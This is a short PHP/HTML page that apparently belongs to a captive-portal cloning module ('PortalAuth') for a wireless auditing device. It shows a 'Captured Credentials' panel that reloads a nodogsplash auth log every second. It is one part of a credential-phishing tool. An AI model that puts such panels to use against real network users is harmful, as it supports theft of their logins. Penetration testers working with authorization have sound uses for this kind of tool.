<?php
define('__ROOT__', dirname(dirname(__FILE__))); 
require_once(__ROOT__.'/functions.php');
global $rel_dir;
?>
<!DOCTYPE html>
<html>
<head>
<script src="/components/infusions/portalauth/includes/js/infusion.js" type="text/javascript"></script>
<script>
pa_auth_log_interval = setInterval(function(){pa_refreshAuthLog();},1000);
</script>
</head>
<body>
<div class="pa_cloner_container">

<h1 class="pa_h1 text_center">Captured Credentials</h1>

<table class="pa_inject_table">
<tr><td align="left" colspan="2">
</td></tr><tr><td align="left" colspan="2">
<textarea id="authlog" readonly><? echo file_get_contents('/www/nodogsplash/auth.log'); ?></textarea>
</td></tr>
</table>

</div>

</body>
</html>